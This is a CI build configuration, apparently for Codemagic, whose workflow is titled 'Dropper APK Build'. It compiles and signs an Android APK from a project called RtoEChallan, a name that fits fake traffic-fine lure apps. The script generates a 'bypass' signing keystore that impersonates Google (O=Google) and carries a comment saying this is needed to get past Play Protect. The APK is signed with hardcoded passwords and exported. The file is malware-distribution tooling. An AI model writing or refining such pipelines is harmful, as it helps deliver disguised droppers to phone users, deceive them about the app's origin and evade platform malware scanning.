workflows:
  android-dropper-build:
    name: Dropper APK Build (Stable Fix)
    max_build_duration: 60
    instance_type: mac_mini_m1
    environment:
      java: 17
    scripts:
      - name: Final Version Alignment
        script: |
          cd RtoEChallan
          
          # 1. Settings ko simplify karo taaki versions automatic manage hon
          cat <<EOF > settings.gradle
          rootProject.name = 'RtoEChallan'
          include ':app'
          EOF

          # 2. Project-level build.gradle (Bilkul stable versions)
          cat <<EOF > build.gradle
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { 
                  classpath 'com.android.tools.build:gradle:8.0.0'
                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.0'
              }
          }
          allprojects {
              repositories { google(); mavenCentral() }
          }
          EOF

          # 3. Auto-Sign (Play Protect ke liye zaroori)
          keytool -genkey -v -keystore bypass.keystore -alias bypass_alias -keyalg RSA -keysize 2048 -validity 10000 -storepass pass123 -keypass pass123 -dname "CN=Android, O=Google, C=US"

          # 4. Clean Build
          gradle wrapper --gradle-version 8.0
          chmod +x gradlew
          ./gradlew clean assembleRelease \
            -Pandroid.injected.signing.store.file=$(pwd)/bypass.keystore \
            -Pandroid.injected.signing.store.password=pass123 \
            -Pandroid.injected.signing.key.alias=bypass_alias \
            -Pandroid.injected.signing.key.password=pass123
          
    artifacts:
      - "**/build/outputs/apk/release/*.apk"
